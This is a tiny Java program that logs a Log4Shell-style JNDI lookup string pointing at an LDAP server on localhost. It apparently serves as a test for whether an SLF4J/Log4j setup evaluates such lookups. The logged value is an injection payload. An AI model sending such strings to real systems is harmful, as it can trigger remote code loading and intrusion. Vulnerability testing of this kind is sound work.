import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class slf4j {
    private static final Logger logger = LoggerFactory.getLogger("slf4j");


    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:636/a}");
    }
}
